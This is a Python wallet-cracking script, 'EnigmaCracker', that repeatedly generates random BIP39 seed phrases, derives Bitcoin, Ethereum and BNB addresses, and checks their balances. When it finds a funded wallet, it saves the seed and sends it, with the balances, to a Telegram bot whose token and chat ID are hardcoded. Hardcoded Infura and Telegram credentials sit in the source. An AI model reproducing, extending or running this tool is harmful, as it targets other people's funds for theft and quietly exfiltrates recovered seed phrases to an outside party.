# EnigmaCracker
from web3 import Web3
import subprocess
import sys
import os
import platform
import requests
import logging
import time
from dotenv import load_dotenv
from bip_utils import (
    Bip39MnemonicGenerator,
    Bip39SeedGenerator,
    Bip44,
    Bip44Coins,
    Bip44Changes,
    Bip39WordsNum,
)

# Constants
LOG_FILE_NAME = "enigmacracker.log"
ENV_FILE_NAME = "EnigmaCracker.env"
WALLETS_FILE_NAME = "wallets_with_balance.txt"

# Global counter for the number of wallets scanned
wallets_scanned = 0

# Get the absolute path of the directory where the script is located
directory = os.path.dirname(os.path.abspath(__file__))
# Initialize directory paths
log_file_path = os.path.join(directory, LOG_FILE_NAME)
env_file_path = os.path.join(directory, ENV_FILE_NAME)
wallets_file_path = os.path.join(directory, WALLETS_FILE_NAME)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(log_file_path),  # Log to a file
        logging.StreamHandler(sys.stdout),  # Log to standard output
    ],
)

# Load environment variables from .env file
load_dotenv(env_file_path)

# Environment variable validation
required_env_vars = ["ETHERSCAN_API_KEY"]
missing_vars = [var for var in required_env_vars if not os.getenv(var)]
if missing_vars:
    raise EnvironmentError(f"Missing environment variables: {', '.join(missing_vars)}")

# Check if we've set the environment variable indicating we're in the correct CMD
if os.environ.get("RUNNING_IN_NEW_CMD") != "TRUE":
    # Set the environment variable for the new CMD session
    os.environ["RUNNING_IN_NEW_CMD"] = "TRUE"

    # Determine the operating system
    os_type = platform.system()

    # For Windows
    if os_type == "Windows":
        subprocess.run(f'start cmd.exe /K python "{__file__}"', shell=True)

    # For Linux
    elif os_type == "Linux":
        subprocess.run(f"gnome-terminal -- python3 {__file__}", shell=True)

    # Exit this run, as we've opened a new CMD
    sys.exit()
BOT_TOKEN = '7997927855:AAGhQHFhmULHhr-cZV7K4lcGBTaDiFugqws'  
CHAT_ID = '759264436'
def send_telegram_message(message):
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"An error occurred: {e}")

def update_cmd_title():
    # Update the CMD title with the current number of wallets scanned
    if platform.system() == "Windows":
        os.system(f"title EnigmaCracker.py - Wallets Scanned: {wallets_scanned}")


def bip():
    # Generate a 12-word BIP39 mnemonic
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)


def bip44_ETH_wallet_from_seed(seed):
    # Generate an Ethereum wallet from a BIP39 seed.

    # Generate the seed from the mnemonic
    seed_bytes = Bip39SeedGenerator(seed).Generate()

    # Create a Bip44 object for Ethereum derivation
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)

    # Derive the account 0, change 0, address_index 0 path (m/44'/60'/0'/0/0)
    bip44_acc_ctx = (
        bip44_mst_ctx.Purpose()
        .Coin()
        .Account(0)
        .Change(Bip44Changes.CHAIN_EXT)
        .AddressIndex(0)
    )

    # Get the Ethereum address
    eth_address = bip44_acc_ctx.PublicKey().ToAddress()

    return eth_address


def bip44_BTC_seed_to_address(seed):
    # Generate the seed from the mnemonic
    seed_bytes = Bip39SeedGenerator(seed).Generate()

    # Generate the Bip44 object
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)

    # Generate the Bip44 address (account 0, change 0, address 0)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)

    # Print the address
    return bip44_addr_ctx.PublicKey().ToAddress()



# Connect to Ethereum mainnet via Infura
INFURA_API_KEY = "1f0759785558425584202addbab55928"  # Replace with your Infura project ID
web3 = Web3(Web3.HTTPProvider(f"https://mainnet.infura.io/v3/{INFURA_API_KEY}"))

# Check connection status
if web3.is_connected():  
    print("Successfully connected to Ethereum network!")
else:
    raise Exception("Failed to connect to Ethereum network")
# Function to get balance of an address

def check_ETH_balance(address):
    try:
        # Get balance in wei
        balance_wei = web3.eth.get_balance(address)
        # Convert balance to Ether
        balance = web3.from_wei(balance_wei, 'ether')  
        return balance
    except Exception as e:
        logging.error(f"Error checking address {address}: {e}")
        return 0

def check_BTC_balance(address, retries=3, delay=5):
    # Check the balance of the address
    for attempt in range(retries):
        try:
            response = requests.get(f"https://blockchain.info/balance?active={address}")
            data = response.json()
            balance = data[address]["final_balance"]
            return balance / 100000000  # Convert satoshi to bitcoin
        except Exception as e:
            if attempt < retries - 1:
                logging.error(
                    f"Error checking balance, retrying in {delay} seconds: {str(e)}"
                )
                time.sleep(delay)
            else:
                logging.error("Error checking balance: %s", str(e))
                return 0
BSC_RPC_URL = "https://bsc-dataseed.binance.org/"  # Public BSC RPC endpoint
web33 = Web3(Web3.HTTPProvider(BSC_RPC_URL))

# Check connection status of BNB
if web33.is_connected():  # Use is_connected() to verify the connection
    print("Successfully connected to Binance Smart Chain!")
else:
    raise Exception("Failed to connect to Binance Smart Chain")

def check_BNB_balance(address):
    try:
        # Get balance in wei
        balance_wei = web33.eth.get_balance(address)
        # Convert balance to BNB (1 BNB = 10^18 wei)
        balance = web33.from_wei(balance_wei, 'ether')  # Use from_wei (all lowercase)
        return balance
    except Exception as e:
        logging.error(f"Error checking address {address}: {e}")
        return None

def write_to_file(ETH_address):
    # Write the seed, address, and balance to a file in the script's directory
    with open(wallets_file_path, "a") as f:
        log_message = f"{ETH_address}\n"
        f.write(log_message)
        logging.info(f"Written to file: {log_message}")


def main():
    global wallets_scanned
    try:
        while True:
            seed = bip()
            # BTC
            BTC_address = bip44_BTC_seed_to_address(seed)
            BTC_balance = check_BTC_balance(BTC_address)

            logging.info(f"Seed: {seed}")
            logging.info(f"BTC address: {BTC_address}")
            logging.info(f"BTC balance: {BTC_balance: .6f} BTC")
            logging.info("")

            # ETH
            ETH_address = bip44_ETH_wallet_from_seed(seed)
            ETH_balance = check_ETH_balance(ETH_address)
            
            logging.info(f"ETH address: {ETH_address}")
            logging.info(f"ETH balance: {ETH_balance: .6f} ETH")

            # BNB
            BNB_address = bip44_ETH_wallet_from_seed(seed)
            BNB_balance = check_BNB_balance(BNB_address)
            
            logging.info(f"BNB address: {BNB_address}")
            logging.info(f"BNB balance: {BNB_balance: .6f} BNB")

            message = f"{seed}, {BTC_balance} BTC, {ETH_balance} ETH, {BNB_balance} BNB"

            # Increment the counter and update the CMD title
            wallets_scanned += 1
            update_cmd_title()

            # Check if the address has a balance
            if BTC_balance > 0 or ETH_balance > 0 or BNB_balance > 0:
                logging.info("(!) Wallet with balance found!")
                write_to_file(seed) 
                write_to_file(ETH_balance)
                write_to_file(BTC_balance)
                write_to_file(BNB_balance)
                write_to_file("wallet")
                send_telegram_message(message)
            
                

    except KeyboardInterrupt:
        logging.info("Program interrupted by user. Exiting...")


if __name__ == "__main__":
    main()

